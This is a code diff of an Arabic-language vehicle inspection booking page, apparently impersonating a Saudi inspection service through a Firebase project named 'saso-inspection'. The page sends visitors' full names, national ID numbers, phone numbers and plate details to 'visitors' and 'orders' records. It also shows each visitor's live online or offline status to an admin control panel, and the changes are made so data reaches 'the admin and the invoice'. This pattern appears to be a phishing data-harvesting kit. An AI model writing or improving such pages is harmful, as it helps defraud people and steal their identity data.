@@ -297,9 +297,8 @@
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 
 <script>
-    // تكوين Firebase الصحيح بناءً على معلوماتك
     const firebaseConfig = {
-      apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT8X6X8X6X8", // تم التعديل بناء على طلبك السابق
+      apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT8X6X8X6X8", 
       authDomain: "saso-inspection.firebaseapp.com",
       databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com/",
       projectId: "saso-inspection",
@@ -311,14 +310,12 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    // إدارة معرف الزائر visitorId للربط بين الصفحات ولوحة التحكم
     let visitorId = localStorage.getItem('visitorId');
     if (!visitorId) {
         visitorId = 'user_' + Math.random().toString(36).substr(2, 9);
         localStorage.setItem('visitorId', visitorId);
     }
 
-    // تحديث حالة العميل "Online" في لوحة التحكم فور الدخول
     const userRef = db.ref('visitors/' + visitorId);
     userRef.update({
         lastActive: firebase.database.ServerValue.TIMESTAMP,
@@ -326,7 +323,6 @@
         status: "online"
     });
 
-    // تحويل الحالة إلى offline عند الخروج
     userRef.onDisconnect().update({
         status: "offline",
         lastSeen: firebase.database.ServerValue.TIMESTAMP
@@ -409,20 +405,21 @@
         btn.disabled = true;
         btn.innerText = "جاري الحفظ...";
 
-        // تجهيز بيانات اللوحة في حال كانت رخصة سير
-        let plateData = "";
+        let finalPlate = "";
         if(currentVehicleStatus === 'license') {
             const c1 = document.getElementById('char1').value.split('|')[0] || "";
             const c2 = document.getElementById('char2').value.split('|')[0] || "";
             const c3 = document.getElementById('char3').value.split('|')[0] || "";
             const num = document.getElementById('plateNumInput').value;
-            plateData = `${num} ${c1} ${c2} ${c3}`;
+            finalPlate = `${num} ${c1} ${c2} ${c3}`;
         } else {
-            plateData = document.getElementById('customs_id').value;
+            finalPlate = document.getElementById('customs_id').value;
         }
 
+        // تم توحيد المسميات هنا لضمان وصولها للأدمن والفاتورة (fullName, vehicleType, plateNumber)
         const formData = {
             fullName: fullName,
+            full_name: fullName,
             idNumber: idNumber,
             nationality: nationality,
             phone: phone,
@@ -430,19 +427,21 @@
             region: region,
             center: center,
             bookingDate: fDate,
+            appointment_date: fDate,
             bookingTime: fTime,
+            appointment_time: fTime,
             vehicleStatus: currentVehicleStatus,
-            plateOrCustoms: plateData,
+            plateNumber: finalPlate,
+            plate_number: finalPlate,
+            vehicleType: document.getElementById('v_type').value,
+            vehicle_type: document.getElementById('v_type').value,
             regType: document.getElementById('reg_type').value,
-            vType: document.getElementById('v_type').value,
             sType: document.getElementById('s_type').value,
             lastUpdate: new Date().toLocaleString('ar-SA'),
             status: "online"
         };
 
-        // إرسال البيانات إلى مسار الزائر الفريد لضمان ظهورها في الوثيقة ولوحة التحكم
         userRef.update(formData).then(() => {
-            // حفظ نسخة في الطلبات العامة أيضاً
             db.ref('orders').push({ ...formData, visitorId: visitorId }).then(() => {
                 window.location.href = "confirm.html";
             });
@@ -453,7 +452,6 @@
         });
     }
 
-    // تهيئة الخريطة بشكل بسيط
     var map = L.map('map').setView([24.7136, 46.6753], 6);
     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
 </script>
